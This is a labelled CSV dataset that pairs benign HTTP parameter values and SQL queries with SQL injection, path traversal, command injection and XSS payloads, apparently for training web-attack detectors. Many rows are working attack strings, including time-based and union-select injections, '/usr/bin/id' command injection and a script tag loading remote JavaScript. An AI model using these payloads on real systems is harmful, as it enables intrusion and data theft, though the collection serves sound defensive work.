payload,attack_type,is_attack,source
1%'))) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('%'=',sqli,1,HttpParamsDataset
8731298131217571,norm,0,HttpParamsDataset
SELECT * FROM given WHERE though = 'breathe',norm,0,SQLiV3
/..//..//..//..//..//..//..//{file},path-traversal,1,HttpParamsDataset
SELECT * FROM ship WHERE sea BETWEEN '1996-07-01' AND '1996-07-31',norm,0,SQLiV3
humphrie,norm,0,HttpParamsDataset
domains_,norm,0,HttpParamsDataset
"  SELECT birdsID AS ID, suit AS still FROM rubbed",norm,0,SQLiV3
29061025l,norm,0,HttpParamsDataset
"1"")) and elt(1210=1210,sleep(5)) and ((""utlk"" like ""utlk",sqli,1,HttpParamsDataset
weintraub,norm,0,HttpParamsDataset
"  UPDATE him SET belt =  'pleasant', City =  'particular' WHERE account =  above",norm,0,SQLiV3
"-5205'   )    )    union all select 8592,8592,8592,8592,8592,8592--",sqli,1,SQLiV3
mckearne,norm,0,HttpParamsDataset
"1%"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli,1,SQLiV3
"1"" and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",sqli,1,SQLiV3
"1'+  (  select 'hoqt' where 4877  =  4877 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli,1,SQLiV3
"1""  )   and 2954  =  1256--",sqli,1,SQLiV3
mundy,norm,0,HttpParamsDataset
1  )   or sleep  (  5  )   and   (  2211  =  2211,sqli,1,SQLiV3
7676907583941560,norm,0,HttpParamsDataset
"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'hryb'  =  'hryb",sqli,1,SQLiV3
"-1370'))) or elt(1032=1032,3623) and ((('xmrg'='xmrg",sqli,1,HttpParamsDataset
SELECT AVG ( flight ) FROM bone SELECT SUM ( but ) ,norm,0,SQLiV3
"1   )    )    as nlzg where 1482  =  1482 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",sqli,1,SQLiV3
37711,norm,0,HttpParamsDataset
"1"")) or sleep(5) and ((""mcyv""=""mcyv",sqli,1,HttpParamsDataset
"-2722""  )   or 4907  =  8126#",sqli,1,SQLiV3
antonino,norm,0,HttpParamsDataset
branden,norm,0,HttpParamsDataset
"1'+  (  select 'qzcx' where 9524  =  9524 and elt  (  3069  =  8430,8430   )    )   +'",sqli,1,SQLiV3
1'   )    )    as yqek where 1957  =  1957,sqli,1,SQLiV3
28515,norm,0,HttpParamsDataset
"-4286%""   )    )     )   union all select 2229,2229,2229,2229,2229,2229#",sqli,1,SQLiV3
60219106t,norm,0,HttpParamsDataset
-8652'  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,sqli,1,SQLiV3
DELETE FROM stared WHERE system = 'whole',norm,0,SQLiV3
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,sqli,1,SQLiV3
"1');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
"1  )   as mnyy where 4409  =  4409 union all select null,null,null,null--",sqli,1,SQLiV3
1');select pg_sleep(5) and ('aydg'='aydg,sqli,1,HttpParamsDataset
eimile,norm,0,HttpParamsDataset
SELECT * FROM  ( SELECT pay FROM could ) ,norm,0,SQLiV3
granfiel,norm,0,HttpParamsDataset
SELECT club ( s )  FROM drawn SELECT roar ( s ) ,norm,0,SQLiV3
crampton4,norm,0,HttpParamsDataset
SELECT * FROM statement WHERE worker  BETWEEN 10 AND 20,norm,0,SQLiV3
"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",sqli,1,SQLiV3
"1))) and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (((6395=6395",sqli,1,HttpParamsDataset
SELECT * FROM call WHERE behind = 'gulf'  OR refer = 'hot',norm,0,SQLiV3
thurston,norm,0,HttpParamsDataset
mcdonald,norm,0,HttpParamsDataset
19275,norm,0,HttpParamsDataset
"campa zabala 184,",norm,0,HttpParamsDataset
49721,norm,0,HttpParamsDataset
5838987688567542,norm,0,HttpParamsDataset
espinoza@canariasatuaire.lb,norm,0,HttpParamsDataset
38428968q,norm,0,HttpParamsDataset
mullen@menorca.com.bf,norm,0,HttpParamsDataset
hi' or 1  =  1 --,sqli,1,SQLiV3
29424173c,norm,0,HttpParamsDataset
15820845l,norm,0,HttpParamsDataset
1)) as wrhe where 6120=6120 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--,sqli,1,HttpParamsDataset
fayanne6,norm,0,HttpParamsDataset
mcilwraith_sopaporn@barebackspain.info,norm,0,HttpParamsDataset
SELECT * FROM  ( SELECT minute FROM excitement ) ,norm,0,SQLiV3
"1'+(select 'swxi' where 7651=7651 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4))+'",sqli,1,HttpParamsDataset
"1  )   as ghew where 6441  =  6441 union all select null,null--",sqli,1,SQLiV3
and 1 in   (  select var from temp  )  --,sqli,1,SQLiV3
"1')) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (('fowu' like 'fowu",sqli,1,HttpParamsDataset
odiosid-ad,norm,0,HttpParamsDataset
"1""  )   as pgza where 8756  =  8756 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli,1,SQLiV3
1) as vxsh where 4706=4706;if(6624=4232) select 6624 else drop function xyyt--,sqli,1,HttpParamsDataset
"1""  )   as eomu where 6599  =  6599",sqli,1,SQLiV3
1))) and 8990=4775 and (((1894=1894,sqli,1,HttpParamsDataset
fuente ezcurra,norm,0,HttpParamsDataset
"1""  )   as xylo where 2112  =  2112 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",sqli,1,SQLiV3
SELECT * FROM correctly WHERE serve NOT LIKE 'inside%',norm,0,SQLiV3
select   (  case when   (  6839  =  2730  )   then 6839 else 6839*  (  select 6839 from mysql.db  )   end  )  #,sqli,1,SQLiV3
aceituna,norm,0,HttpParamsDataset
"  SELECT * FROM here WHERE gun NOT IN  ( 'power', 'shorter', 'sound' )  ",norm,0,SQLiV3
"1%""  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli,1,SQLiV3
rubi de biasi,norm,0,HttpParamsDataset
bucardo,norm,0,HttpParamsDataset
"   SELECT transportation, older+ ', ' + traffic+ ' ' + surprise+ ', ' + simple AS quietly  FROM full",norm,0,SQLiV3
"carrer asturies, 49",norm,0,HttpParamsDataset
8651552740405089,norm,0,HttpParamsDataset
SELECT * FROM closely WHERE main BETWEEN 'joined' AND 'universe',norm,0,SQLiV3
cabieces amayuela,norm,0,HttpParamsDataset
SELECT * FROM farm WHERE grass = 'material' FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
"1%"")));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (((""%""=""",sqli,1,HttpParamsDataset
"-4694') where 1501=1501 union all select 1501,1501,1501,1501,1501,1501#",sqli,1,HttpParamsDataset
"1"" and 4595  =  4595#",sqli,1,SQLiV3
select * from users where id  =  1 +$+. or 1  =  1 -- 1,sqli,1,SQLiV3
09339,norm,0,HttpParamsDataset
SELECT * FROM vapor WHERE flat = 'review'  AND City = 'branch',norm,0,SQLiV3
"-5198   )    )     )   union all select 7089,7089,7089,7089,7089,7089,7089,7089#",sqli,1,SQLiV3
1);select (case when (2056=1917) then 2056 else 1/(select 0) end)--,sqli,1,HttpParamsDataset
astar@guiapolicial.lt,norm,0,HttpParamsDataset
99999464h,norm,0,HttpParamsDataset
"1%' and elt  (  7619  =  1489,1489  )   and '%'  =  '",sqli,1,SQLiV3
a2b66r5z,norm,0,HttpParamsDataset
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_doing_cron' LIMIT 1,norm,0,SQLiV3
1') and (select * from (select(sleep(5)))fzno),sqli,1,HttpParamsDataset
desyerbadora,norm,0,HttpParamsDataset
"1',  (  select   (  case when   (  2106  =  2106  )   then   (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   else 2106*  (  select 2106 from master..sysdatabases  )   end   )    )   ",sqli,1,SQLiV3
SELECT Count ( * )  AS again,norm,0,SQLiV3
tacuara,norm,0,HttpParamsDataset
"1'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('zxrb'='zxrb",sqli,1,HttpParamsDataset
SELECT * FROM  ( SELECT sheet FROM southern ) ,norm,0,SQLiV3
1867101585349432,norm,0,HttpParamsDataset
SELECT find ( s ) FROM produce INNER JOIN,norm,0,SQLiV3
1   )    )    as kiqk where 7366  =  7366 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,sqli,1,SQLiV3
"1"" where 3692=3692 union all select null,null--",sqli,1,HttpParamsDataset
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",sqli,1,SQLiV3
"  UPDATE whole SET life =  'man', City =  'key' WHERE recall =  valuable",norm,0,SQLiV3
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa/../../../{file},path-traversal,1,HttpParamsDataset
verney,norm,0,HttpParamsDataset
"select * from generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   limit 1--",sqli,1,SQLiV3
178,norm,0,HttpParamsDataset
"1%""  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,sqli,1,SQLiV3
2olt,norm,0,HttpParamsDataset
"1""  )   where 3321  =  3321",sqli,1,SQLiV3
valdebenito garabana,norm,0,HttpParamsDataset
"1""));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,HttpParamsDataset
"-3393""   )    )    union all select 5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",sqli,1,SQLiV3
9.16233E+015,norm,0,SQLiV3
42141,norm,0,HttpParamsDataset
(select (case when (6838=2866) then 6838 else 1/(select 0) end)),sqli,1,HttpParamsDataset
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",sqli,1,SQLiV3
"1') as rqfq where 7077=7077 or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,HttpParamsDataset
milionario.kirkham@programa-gestion-erp.mil,norm,0,HttpParamsDataset
"  SELECT * FROM rhythm WHERE limited IN  ( 'wolf', 'hill', 'himself' )  ",norm,0,SQLiV3
" select * from users where id  =  1 or  1<@  =  1 union select 1,version  (    )   -- 1",sqli,1,SQLiV3
SELECT TOP 3 * FROM flag WHERE hand = 'powerful',norm,0,SQLiV3
bellaguarda,norm,0,HttpParamsDataset
SELECT * FROM native WHERE couple = 'hard',norm,0,SQLiV3
waitfor delay '0:0:5' and    (    (   'uvlf'  =  'uvlf,sqli,1,SQLiV3
SELECT * FROM roar,norm,0,SQLiV3
45480,norm,0,HttpParamsDataset
SELECT * FROM solar WHERE end = 'audience' LIMIT 3,norm,0,SQLiV3
SELECT * FROM vessels FETCH FIRST 3 ROWS ONLY,norm,0,SQLiV3
a corua,norm,0,HttpParamsDataset
"   SELECT Employees.furniture, COUNT ( Orders.otherID )  AS wellFROM    ( OrdersINNER JOIN judge ON Orders.spokenID  =  Employees.scienceID ) ",norm,0,SQLiV3
"1'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli,1,SQLiV3
SELECT AVG ( build ) FROM gradually,norm,0,SQLiV3
"-4100'   )    )    union all select 1163,1163,1163--",sqli,1,SQLiV3
montoro,norm,0,HttpParamsDataset
22001,norm,0,HttpParamsDataset
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl",sqli,1,HttpParamsDataset
"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",sqli,1,SQLiV3
c1lab8,norm,0,HttpParamsDataset
amenta,norm,0,HttpParamsDataset
-4104%' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and '%'  =  ',sqli,1,SQLiV3
9437,norm,0,HttpParamsDataset
calle juan de dios montaes s/n,norm,0,HttpParamsDataset
91624121x,norm,0,HttpParamsDataset
SELECT TOP 3 * FROM hot,norm,0,SQLiV3
"calle valsendero, 48,",norm,0,HttpParamsDataset
"1"" where 5250  =  5250",sqli,1,SQLiV3
SELECT * FROM solar WHERE known BETWEEN 'declared' AND 'nothing',norm,0,SQLiV3
1541444021319279,norm,0,HttpParamsDataset
| /bin/sleep 31 ;,cmdi,1,HttpParamsDataset
"1'||(select 'eils' where 8308=8308 or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,HttpParamsDataset
"  SELECT neededID AS ID, street AS carried FROM chest",norm,0,SQLiV3
exigidad,norm,0,HttpParamsDataset
"   SELECT COUNT ( negative ) , attack FROM night BY lonely",norm,0,SQLiV3
SELECT volume ( s )  FROM wealth LEFT JOIN,norm,0,SQLiV3
"-4005' where 3963  =  3963 or elt  (  1032  =  1032,3623  )  --",sqli,1,SQLiV3
"1'+(select 'eoxk' where 6621=6621 union all select null,null#",sqli,1,HttpParamsDataset
"praza pascasio fernandez seguin, 73,",norm,0,HttpParamsDataset
roncar,norm,0,HttpParamsDataset
/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa..........{file},path-traversal,1,HttpParamsDataset
SELECT * FROM band FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM black,norm,0,SQLiV3
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 21 )  ORDER BY meta_id ASC",norm,0,SQLiV3
cribada,norm,0,HttpParamsDataset
carraspeo,norm,0,HttpParamsDataset
25114760w,norm,0,HttpParamsDataset
1'   )    )    as vwua where 8099  =  8099 union all select null--,sqli,1,SQLiV3
SELECT baseball ( s )  FROM consist FULL OUTER JOIN,norm,0,SQLiV3
"1"") where 5828=5828 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,HttpParamsDataset
SELECT AVG ( setting ) FROM review SELECT SUM ( agree ) ,norm,0,SQLiV3
"1""));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--",sqli,1,HttpParamsDataset
"SELECT * FROM edge WHERE silver BETWEEN ""heard"" AND    ""tube""",norm,0,SQLiV3
descabal!gadura,norm,0,HttpParamsDataset
torreblacos,norm,0,HttpParamsDataset
SELECT * FROM when WHERE Price NOT BETWEEN 10 AND 20,norm,0,SQLiV3
gungor,norm,0,HttpParamsDataset
5exas9labo,norm,0,HttpParamsDataset
declare @q nvarchar   (  200  )   0x730065006c00650063 ...,sqli,1,SQLiV3
(case when 5640=5640 then 5640 else null end),sqli,1,HttpParamsDataset
"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli,1,SQLiV3
"1""  )   where 2016  =  2016 and   (  1547  =  2093  )  *2093--",sqli,1,SQLiV3
"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting",xss,1,HttpParamsDataset
"1'   )    )    and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (   'inrm' like 'inrm",sqli,1,SQLiV3
amaranta,norm,0,HttpParamsDataset
08571,norm,0,HttpParamsDataset
48102,norm,0,HttpParamsDataset
""" onmouseover=alert(xss) "">",xss,1,HttpParamsDataset
SELECT AVG ( consonant ) FROM music SELECT SUM ( dinner ) ,norm,0,SQLiV3
postema,norm,0,HttpParamsDataset
SELECT AVG ( military ) FROM entirely,norm,0,SQLiV3
"<script/xss id=xss src=""http://ha.ckers.org/xss.js""></script>",xss,1,HttpParamsDataset
SELECT * FROM beauty ORDER BY course DESC,norm,0,SQLiV3
"1%')) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (('%'='",sqli,1,HttpParamsDataset
SELECT * FROM yet,norm,0,SQLiV3
2u17z0o,norm,0,HttpParamsDataset
regidor fa,norm,0,HttpParamsDataset
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 173 )  ORDER BY meta_id ASC",norm,0,SQLiV3
SELECT * FROM board  WHERE eleven = expression,norm,0,SQLiV3
"1') and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,HttpParamsDataset
"1""   )    )    as casz where 5921  =  5921 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",sqli,1,SQLiV3
1 where 1636  =  1636 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sqli,1,SQLiV3
$;/usr/bin/id,cmdi,1,HttpParamsDataset
c28a3iz8,norm,0,HttpParamsDataset
"1"" and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",sqli,1,SQLiV3
<? echo('<scr)';,xss,1,HttpParamsDataset
malleson_varney@tomorrow.com.cz,norm,0,HttpParamsDataset
"1') or char(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,HttpParamsDataset
SELECT COUNT ( pine )  FROM cut,norm,0,SQLiV3
"1"") as lvbm where 8179=8179;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,HttpParamsDataset
"1,extractvalue(9788,concat(0x5c,0x7171706a71,(select (elt(9788=9788,1))),0x717a767a71))",sqli,1,HttpParamsDataset
1)) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((9452=9452,sqli,1,HttpParamsDataset
" select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1",sqli,1,SQLiV3
1'  )   as pwqs where 2291  =  2291,sqli,1,SQLiV3
SELECT * FROM drive WHERE cattle LIKE '%fly%',norm,0,SQLiV3
"1'));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (('nimx'='nimx",sqli,1,HttpParamsDataset
1')) and 7533=7533 and (('gvoh'='gvoh,sqli,1,HttpParamsDataset
SELECT range ( s )  FROM furniture UNION ALL,norm,0,SQLiV3
"1""))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((""opdl""=""opdl",sqli,1,HttpParamsDataset
44561,norm,0,HttpParamsDataset
SELECT DISTINCT sides FROM wire,norm,0,SQLiV3
"luis diaz cobea, 98,",norm,0,HttpParamsDataset
xiaojing,norm,0,HttpParamsDataset
/..../{file},path-traversal,1,HttpParamsDataset
kirk,norm,0,HttpParamsDataset
SELECT * FROM common WHERE struggle = 'none'  OR silk = 'fifteen',norm,0,SQLiV3
8ap6l4984,norm,0,HttpParamsDataset
"-3767'  )   as eefl where 8260  =  8260 union all select 8260,8260,8260,8260,8260,8260,8260#",sqli,1,SQLiV3
"-9297) union all select 6841,6841,6841,6841,6841--",sqli,1,HttpParamsDataset
SELECT AVG ( Price ) FROM fair,norm,0,SQLiV3
"-3707""))) or 8571=8571--",sqli,1,HttpParamsDataset
(7098=7098 and sleep(5)),sqli,1,HttpParamsDataset
"1' where 9961=9961 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,HttpParamsDataset
"1' and elt(3114=3114,sleep(5))#",sqli,1,HttpParamsDataset
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)-- jdia,sqli,1,HttpParamsDataset
SELECT * FROM mirror 3 SELECT * FROM pen,norm,0,SQLiV3
"germanies 18,",norm,0,HttpParamsDataset
hurg89an1035a,norm,0,HttpParamsDataset
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,sqli,1,SQLiV3
SELECT AVG ( piece ) FROM snow SELECT SUM ( lay ) ,norm,0,SQLiV3
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'jryo'  =  'jryo,sqli,1,SQLiV3
-2411%'))) or 6872=6872 and ((('%'=',sqli,1,HttpParamsDataset
elian,norm,0,HttpParamsDataset
1' where 8128  =  8128,sqli,1,SQLiV3
